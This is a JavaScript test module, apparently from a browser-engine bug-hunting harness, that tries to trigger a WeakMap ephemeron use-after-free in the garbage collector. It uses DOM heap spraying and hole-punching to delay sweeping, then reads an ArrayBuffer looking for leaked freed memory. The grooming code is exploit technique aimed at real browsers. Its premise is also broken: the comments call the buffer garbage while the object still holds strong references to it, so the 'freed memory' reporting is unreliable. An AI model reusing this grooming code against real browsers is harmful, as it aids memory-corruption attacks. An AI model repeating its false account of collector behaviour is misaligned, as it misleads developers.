
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'WEAKMAP_EPHEMERON_UAF',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Desincronização da tabela de Ephemerons do GC. Cria uma corrente de dependência (k1->k2->buffer). ' +
        'k1 é anulado, forçando o GC a marcar a árvore morta. Esburacamos a RAM para atrasar a ' +
        'fase de Sweeping e tentamos aceder à memória nativa prematuramente.',

    setup: function() {
        this.wm = new WeakMap();
        this.results = {};
        
        // As chaves do Ephemeron
        this.k1 = {};
        this.k2 = {};
        
        // A Memória Nativa Suculenta (ArrayBuffer)
        this.buffer = new ArrayBuffer(1024 * 1024); // 1MB
        new Uint32Array(this.buffer)[0] = 0x1337;

        // A Corrente C++
        this.wm.set(this.k1, this.k2);
        this.wm.set(this.k2, this.buffer);
    },

    trigger: async function() {
        // 1. O GATILHO: Cortamos a cabeça da cobra. k2 e buffer agora são lixo.
        this.k1 = null;

        // 2. Fragmentamos a memória massivamente para ocupar a thread de Sweeping do GC
        let trash = Groomer.sprayDOM('canvas', 500);
        Groomer.punchHoles(trash, 2);

        // Dá um microssegundo para o GC arrancar, mas não tempo suficiente para terminar a varredura
        await new Promise(r => setTimeout(r, 2));

        try {
            // A BOMBA: Tentamos ler a memória de k2.
            // Se o marcador do GC se perdeu, a memória nativa pode ter sido apagada 
            // mas o JS ainda retém o ponteiro!
            let view = new Uint32Array(this.buffer);
            this.results.leak = view[0];
        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        s => s.results.error || 'Leitura de Memória Concluída',
        
        s => {
            let leak = s.results.leak;
            if (leak !== undefined) {
                // Se leu 0x1337 (4919), é stale data seguro. Se for diferente, é C++ freed memory!
                if (leak !== 0x1337 && leak !== 0) {
                    return leak; // Dispara STALE DATA no HUD
                }
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        this.k1 = null;
        this.k2 = null;
        this.buffer = null;
        this.wm = null;
        this.results = {};
    }
};
